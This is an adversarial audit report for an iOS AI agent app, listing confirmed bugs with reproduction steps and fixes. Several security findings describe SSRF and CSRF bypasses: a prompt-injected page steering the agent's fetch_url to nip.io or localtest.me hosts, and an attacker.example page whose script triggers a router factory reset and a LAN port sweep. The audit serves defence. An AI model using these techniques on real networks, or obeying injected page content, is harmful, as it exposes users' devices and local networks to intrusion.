# Open audit findings

Adversarial audit, 2026-08-01: 33 raised, **19 confirmed**, 14 refuted.
The two blockers, all five highs and the upload-blocking medium are fixed in `8973b60`.
What follows is what remains — each one was independently verified as real, so
none of it is speculative.

## 1. [medium] Backup import restores agents.json under a live AgentStore that is never reloaded; the first roster edit writes the stale in-memory list back over it

`/Users/enrico/Documents/GitHub/ai-app/AIApp/Views/SettingsView.swift:203` — lens: data-safety

**Fails when:** Fresh install (no agents.json yet). AgentStore.shared is constructed at launch by ChatListView:8 with agents = []. The user imports a backup: BackupService.restore writes the backup's roster to agents.json and reports 'Agenten übernommen'. AgentStore.shared still holds [] — AgentStore.reload() exists (AgentStore.swift:192) but is called from nowhere in the codebase, so the Agents tab shows the 'Noch keine Agenten' empty state. The user, believing the import failed, creates one agent; add() → persist() writes that single agent over the freshly restored file and the imported roster is gone. This is precisely the bug ChatSession.reloadFromDisk() was added to fix for chats (called on the line quoted below), applied to chats only.

**Fix:** Call AgentStore.shared.reload() (and refresh any live SkillStore) immediately after BackupService.restore succeeds, next to session.reloadFromDisk(). Also have restore() report which files it actually wrote so only those are reloaded.

## 2. [medium] Browser-tier mini-app reaches private/LAN addresses despite the openTarget guard

`AIApp/Views/MiniAppRunnerView.swift:160` — lens: security

**Fails when:** `load()` validates the `<!-- open: … -->` target with `NetworkTargetValidator.isAllowed(target, allowPrivate: false)` and refuses private addresses — but when it refuses, it falls through to `loadHTMLString(Sandbox.harden(html, .browser))`, and the shell that WebAppBuilder generates contains `<script>location.replace(url)</script>` plus `<a href="url">` for that exact URL (AIApp/Services/WebAppBuilder.swift:37-38). `decidePolicyFor` then allows the navigation unconditionally for the browser tier — it never consults NetworkTargetValidator. Concretely: an agent-generated app with `<!-- capability: browser --><!-- open: http://192.168.178.1/ -->` is "refused" by load(), the shell renders, its inline script navigates to http://192.168.178.1/ and the router admin page loads inside the mini-app (ATS allows cleartext, and the Local Network prompt was already granted for the user's Ollama/sub2api gateway). The same applies to 127.0.0.1:11434 and 169.254.169.254, and to any post-load link/script navigation in a browser app that started at a legitimate public site. The user consented to "Webseiten öffnen und laden", and the code comment at line 23-24 claims private/LAN addresses are never loaded; neither is true.

**Fix:** Apply the same validator inside the policy handler: `guard NetworkTargetValidator.isAllowed(url, allowPrivate: false) else { decisionHandler(.cancel); return }` before allowing a browser-tier navigation, and re-check it on every hop (also in `createWebViewWith`). Additionally, when `load()` refuses the open target, do not fall back to rendering the shell that re-navigates to the same refused URL — show a refusal placeholder instead.

## 3. [medium] isBlockedHost only inspects the literal host string, so a DNS name pointing at a private IP passes

`AIApp/Tools/FetchURLTool.swift:99` — lens: security

**Fails when:** Every SSRF decision (FetchURLTool, its redirect blocker, BrowserFetch, and NetworkTargetValidator) is made on the textual host. Nothing resolves the name, so a public DNS name that resolves to a private address sails through. With a cloud provider (`allowPrivateHosts == false`, the case the guard exists for), a prompt-injected page can steer the agent to `fetch_url("http://192.168.178.1.nip.io/status")` or `http://localtest.me:11434/api/tags`: the host string ends in `.nip.io`/`.me`, is not `localhost`, not `.local/.internal/.lan`, and is not an IPv4/IPv6 literal, so `isBlockedHost` returns false — then URLSession resolves it to 192.168.178.1 / 127.0.0.1 and fetches it, and the response body is returned to the model. The redirect blocker at line 243 uses the same string test and is bypassed identically.

**Fix:** Resolve the host before deciding: run `getaddrinfo`/`NWEndpoint` on the hostname and apply `isPrivateHost` to every returned address, refusing if any is private (and re-do it per redirect hop). Cheap hardening in the meantime: reject any hostname whose labels contain an embedded dotted-quad or hex/decimal IPv4 form (the `*.nip.io`/`*.sslip.io`/`localtest.me` pattern).

## 4. [medium] Local transcript budget drops the user's message for the later speakers in a group round

`AIApp/Services/LocalRuntimePolicy.swift:84` — lens: recent-work

**Fails when:** The "always keep the newest" exemption assumes the newest message is the thing being answered. In a group round it is a *peer's turn*: GroupChatRunner.runRound appends each turn to `running` (GroupChatRunner.swift:85-90) before the next agent calls transcriptWindow (GroupChatRunner.swift:130-135). With budget 6_000 and a per-turn cap of 4_000 (maxReplyCharacters) — or 60_000 when the turn contains a fence (maxCodeReplyCharacters) — take transcript [user(25 chars), Rechercheur(3_500), Kritiker(3_500)]. For the lead: reversed → Kritiker kept unconditionally (used=3_500); Rechercheur 3_500+3_500=7_000 > 6_000 → break. The lead receives exactly one message, the Kritiker's turn, with the user's question and the Rechercheur's contribution both gone. Its system prompt (leadBrief) tells it to summarise the agreement, credit contributors, and deliver the mini-app the user asked for — it can no longer see what was asked. Worse with a mini-app turn: one 60_000-char fenced reply alone exceeds the budget by 10x and becomes the lead's entire input.

**Fix:** Protect the newest *user* message as well as the newest message: pre-reserve `transcript.last(where: { $0.role == .user })` and always include it (in chronological position), then fill the remaining budget from the newest backwards. Alternatively exclude fenced/code turns from the shared window for local providers rather than letting one absorb the whole budget.

## 5. [medium] diagnosticsWriteNumber heap-allocates a Swift Array inside the signal handler

`AIApp/Services/DiagnosticsRecorder.swift:198` — lens: recent-work

**Fails when:** `[CChar](repeating:count:)` lowers to _allocateUninitializedArray → swift_allocObject → malloc, plus retain/release of the array buffer. Stack promotion is an optimiser courtesy, not a guarantee, and does not happen at -Onone at all. This runs on the first line of the handler's write path (line 218, for the signal number itself), so it executes on every caught crash. Same deadlock as above: SIGABRT raised from inside malloc (heap corruption, double free — the single most common source of SIGABRT on iOS) leaves the malloc lock held; the handler mallocs and hangs. The marker file has already been opened with O_TRUNC by then, so the previous run's marker is destroyed while the new one is never completed.

**Fix:** Use a pre-allocated global scratch buffer initialised in install(), exactly like signalFrameBuffer is supposed to be: `private nonisolated(unsafe) var signalDigitBuffer = UnsafeMutablePointer<CChar>.allocate(capacity: 24)`, and index it directly. A fixed-size tuple with withUnsafeMutableBytes also works; a Swift Array does not.

## 6. [medium] MetricKit payload file is never consumed, so an old crash is attached to every later run's report

`AIApp/Services/DiagnosticsRecorder.swift:340` — lens: recent-work

**Fails when:** metrickit-latest.json is written by MetricKitCollector.didReceive (line 726) and removed only by clear() (line 544) — rotate() removes markerURL and currentURL but not metricURL. Sequence: launch 1 crashes with SIGSEGV; launch 2 receives the MXDiagnosticPayload and writes it; launch 3 exits cleanly; launch 4 opens Mehr → Diagnose. rotate() loads the launch-1 payload into previousMetric and lastRunSnapshot() (line 494, the 0dda971 re-read) keeps refreshing it from the same untouched file, so the report prints "Ergebnis: sauber beendet" for the last run and immediately below it "SYSTEMBERICHT (MetricKit) — Von iOS selbst erstellt. Enthält den symbolisierten Stack und den Abbruchgrund" with the old crash's exceptionType/signal, undated. The user forwards a report that asserts a crash which did not happen in the run being examined — exactly the known-vs-inferred confusion DiagnosticsReport.swift:5-11 is written to prevent.

**Fix:** Stamp the payload with the run id / receipt date when writing it and either delete metricURL in rotate() once it has been folded into previousRun, or carry the timestamp into the report header so the section states which run the system diagnostic belongs to.

## 7. [medium] Per-agent local model chosen in AgentModelPicker is silently ignored; the global localModelId always runs

`AIApp/Models/AgentStore.swift:88` — lens: recent-work

**Fails when:** AgentModelPicker offers LocalModel.catalog for preset "mlx" (ModelCatalogCache.swift:102-105) and stores the picked hub id in AgentDefinition.model (AgentModelPicker.swift:186-190). settings(fallback:) then builds connectionSnapshot(presetId: "mlx") and overwrites only `.model` — never `.localModelId`. But ProviderSettings.makeProvider dispatches `case .mlx: return MLXProvider(modelId: localModelId)`, and connectionSnapshot set localModelId from ProviderProfiles.profile("mlx").localModelId, i.e. the globally selected model. So a group where the Kritiker is set to Qwen3-1.7B and the Leitung to Qwen3-4B runs both on whatever single model is selected in Mehr → Anbieter, while the UI shows two different models. It also defeats the point of MLXRuntime.maxResidentModels == 1 being justified by "agents in a group may each name their own model" — with this code they cannot.

**Fix:** In settings(fallback:), route the agent's model into the field the dialect actually reads: `if !model.isEmpty { if resolved.preset.dialect == .mlx { resolved.localModelId = model } else { resolved.model = model } }`. Same for the inherit branch at line 84-86.

## 8. [low] quarantineChatStore's 'do NOT continue' is unenforceable — restore() falls through and the next persist() destroys the archive it failed to copy

`/Users/enrico/Documents/GitHub/ai-app/AIApp/Agent/AgentLoop.swift:1241` — lens: data-safety

**Fails when:** chat-threads.json is large (mini-app source pins are up to 80,000 chars each, so multi-MB archives are normal) and fails to decode. restore() calls quarantineChatStore(stored); the duplicate-sized copy fails (ENOSPC on a nearly-full device — the same condition that plausibly produced the bad file), so the function returns early WITHOUT removing the original, exactly as its comment intends. But the function returns Void: restore() carries on to `let fresh = ChatThread(); threads = [fresh]`. The very next persist() — one tap on 'Neuer Chat' or one message, a few hundred bytes, which fits where the multi-MB copy did not — writes an empty snapshot atomically over the archive. Every conversation is gone with no quarantine copy. SkillStore.quarantine(_:) returns Bool and its caller guards on it (SkillStore.swift:89-91); this one cannot.

**Fix:** Make quarantineChatStore return Bool (mirroring SkillStore.quarantine) and have restore() bail out when it is false — leave `threads` empty and set a persist-disabled/read-only flag (or an errorMessage) so no write can occur until the user has been told, instead of silently starting fresh on top of an un-copied archive.

## 9. [low] BrowserFetch filters navigations only — the fetched page's own subresource requests reach the LAN unchecked

`AIApp/Tools/BrowserFetch.swift:130` — lens: security

**Fails when:** The doc comment claims "every hop is re-checked", but `decidePolicyFor` is only invoked for navigations. The offscreen WKWebView runs the fetched page's JavaScript (`allowsContentJavaScript = true`, line 57) with no CSP and with `NSAllowsArbitraryLoads` in effect, so `fetch()`, `XMLHttpRequest`, `<img src>`, `<script src>` and WebSocket requests from that page never pass through the validator. Concretely: the agent calls `fetch_url("https://attacker.example/a")`; the server returns a thin HTML shell (which is exactly what triggers the BrowserFetch fallback at FetchURLTool.swift:60-64) whose script issues `new Image().src = 'http://192.168.1.1/cgi-bin/factory_reset'` and a port sweep across 192.168.1.0/24. Those requests are executed from the user's device on their LAN during the 25s window, entirely outside the SSRF guard — a state-changing CSRF and a port scan driven by content the agent merely tried to read.

**Fix:** Attach a compiled `WKContentRuleList` to the BrowserFetch configuration that blocks loads to private/loopback/link-local hosts (and, when `allowPrivateHosts` is false, everything matching the RFC1918/CGNAT/169.254 patterns), or inject a restrictive CSP via a `WKUserScript`/scheme handler. Blocking subresources also makes the extracted text deterministic.

## 10. [low] Memory-warning abort path leaves runningThreadId set, pinning a permanent "läuft…" spinner on the thread

`AIApp/Agent/AgentLoop.swift:981` — lens: recent-work

**Fails when:** A local group round crosses memoryWarningAbortThreshold (16). The new abort block clears busy, statusLine, ScreenWake and the Live Activity, then returns — but never clears runningThreadId, which was set at line 897 and is only reset on the normal-completion path at line 999. ChatListView.swift:105 renders `if session.runningThreadId == thread.id` as a ProgressView plus "läuft…", and that branch also suppresses the participant-names row in its else-if. Result: after the abort the user sees the error banner, the session is idle and accepts new input, yet that conversation shows a spinning "läuft…" in the chat list indefinitely — until some later round in the same thread happens to finish normally.

**Fix:** Add `self.runningThreadId = nil` to the abort block (and to the empty-participants guard at line 886-895, which has the same omission when reached from the auto-continuation recursion at line 995).
